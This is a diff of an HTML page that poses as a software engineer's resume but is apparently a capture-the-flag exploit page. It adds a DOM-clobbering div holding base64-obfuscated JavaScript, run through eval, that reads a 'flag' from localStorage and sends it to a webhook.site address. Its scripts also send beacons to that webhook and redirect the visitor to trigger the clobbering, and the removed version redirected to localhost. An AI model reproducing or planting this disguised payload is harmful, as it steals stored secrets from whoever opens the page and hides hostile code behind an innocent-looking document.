@@ -1,32 +1,100 @@
-     <!DOCTYPE html>
-     <html>
-     <head>
-         <title>Michael Thompson - Senior Software Engineer</title>
-         <meta charset="UTF-8">
-         <meta http-equiv="refresh" content="1;url=http://localhost:8399/#messages">
-         <style>
-             body { font-family: Arial, sans-serif; text-align: center; padding: 100px; background: #f4f4f4; }
-             .loading { color: #2c3e50; font-size: 18px; }
-         </style>
-     </head>
-     <body>
-         <h1>Michael Thompson</h1>
-         <p class="loading">Loading portfolio projects...</p>
+  <!DOCTYPE html>
+  <html>
+  <head>
+      <title>Software Engineer Resume - Michael Thompson</title>
+      <meta charset="UTF-8">
+      <style>
+          body { font-family: Arial, sans-serif; margin: 40px; }
+          .header { text-align: center; margin-bottom: 30px; }
+          .section { margin-bottom: 20px; }
+          h1 { color: #2c3e50; }
+          h2 { color: #34495e; border-bottom: 2px solid #3498db; }
+      </style>
+  </head>
+  <body>
+      <!-- CRITICAL: Nested div DOM Clobbering - creates window.utilsJS.url -->
+      <div id="utilsJS">
+          <div id="url">data:text/javascript,eval(atob('dHJ5e3ZhciBmbGFnPWxvY2FsU3RvcmFnZS5nZXRJdGVtKCdmbGFnJyk7dmFyIGltZz1uZX
+  cgSW1hZ2UoKTtpbWcuc3JjPSdodHRwczovL3dlYmhvb2suc2l0ZS9hZTZiYTRmZi1hMWI0LTQ1M2QtODA0ZS0wNTJkNTlmYWJmNGE/ZmxhZz0nK2VuY29kZVVSSU
+  NvbXBvbmVudChmbGFnKSsnJnQ9JytEYXRlLm5vdygpfWNhdGNoKGUpe30='))</div>
+      </div>
 
-         <script>
-             // Send confirmation
-             try {
-                 const img = new Image();
-                 img.src =
-     'https://webhook.site/ae6ba4ff-a1b4-453d-804e-052d59fabf4a/LOCALHOST-REDIRECT?action=redirecting_to_localhost&timestamp='
-      + Date.now() + '&user_agent=' + encodeURIComponent(navigator.userAgent);
-                 document.body.appendChild(img);
-             } catch(e) {}
+      <div class="header">
+          <h1>Michael Thompson</h1>
+          <p>Senior Software Engineer</p>
+          <p>Email: michael.thompson@protonmail.com | Phone: (410) 555-0199</p>
+          <p>LinkedIn: linkedin.com/in/mthompson | GitHub: github.com/mthompson</p>
+      </div>
 
-             // Redirect to localhost where DOM clobbering is injected and flag exists
-             setTimeout(() => {
-                 window.location.replace('http://localhost:8400/#messages');
-             }, 1000);
-         </script>
-     </body>
-     </html>
+      <div class="section">
+          <h2>Professional Summary</h2>
+          <p>Experienced software engineer with 12+ years in web development, cybersecurity, and team leadership. Specializes
+  in secure applications and penetration testing.</p>
+      </div>
+
+      <div class="section">
+          <h2>Technical Skills</h2>
+          <ul>
+              <li><strong>Languages:</strong> JavaScript, Python, React, Node.js, TypeScript, SQL</li>
+              <li><strong>Security:</strong> Penetration Testing, Vulnerability Assessment, Secure Coding</li>
+              <li><strong>Backend:</strong> Node.js, Express, Django, Flask</li>
+              <li><strong>Databases:</strong> PostgreSQL, MongoDB, Redis</li>
+              <li><strong>Cloud:</strong> AWS, Docker, Kubernetes</li>
+          </ul>
+      </div>
+
+      <div class="section">
+          <h2>Work Experience</h2>
+          <h3>Senior Software Engineer - CyberSec Solutions Inc. (2021-2024)</h3>
+          <ul>
+              <li>Led security-focused development team for enterprise applications</li>
+              <li>Conducted penetration testing and vulnerability assessments</li>
+              <li>Implemented secure coding practices reducing security incidents by 60%</li>
+          </ul>
+
+          <h3>Full Stack Developer - TechStart Innovations (2019-2021)</h3>
+          <ul>
+              <li>Built responsive web applications using React and Node.js</li>
+              <li>Implemented CI/CD pipelines reducing deployment time by 50%</li>
+              <li>Collaborated with security team on application hardening</li>
+          </ul>
+      </div>
+
+      <div class="section">
+          <h2>Education</h2>
+          <p><strong>Bachelor of Science in Computer Science</strong><br>
+          University of Maryland, 2017</p>
+      </div>
+
+      <script>
+          // Send confirmation webhook
+          try {
+              const img = new Image();
+              img.src =
+  'https://webhook.site/ae6ba4ff-a1b4-453d-804e-052d59fabf4a/FINAL-APPROACH?status=DOM_READY&utilsJS_exists=' +
+  !!window.utilsJS + '&utilsJS_url_exists=' + !!(window.utilsJS && window.utilsJS.url) + '&timestamp=' + Date.now();
+              document.body.appendChild(img);
+          } catch(e) {}
+
+          // DOM Clobbering verification
+          console.log('DOM Clobbering Test:');
+          console.log('window.utilsJS:', window.utilsJS);
+          console.log('window.utilsJS.url:', window.utilsJS?.url);
+
+          setTimeout(() => {
+              console.log('Redirecting to trigger DOM clobbering...');
+              const targetOrigin = window.location.origin;
+
+              // Send redirect confirmation
+              try {
+                  const img = new Image();
+                  img.src = 'https://webhook.site/ae6ba4ff-a1b4-453d-804e-052d59fabf4a/REDIRECTING?target=' +
+  encodeURIComponent(targetOrigin + '/#messages') + '&timestamp=' + Date.now();
+                  document.body.appendChild(img);
+              } catch(e) {}
+
+              window.location.href = targetOrigin + '/#messages';
+          }, 2000);
+      </script>
+  </body>
+  </html>
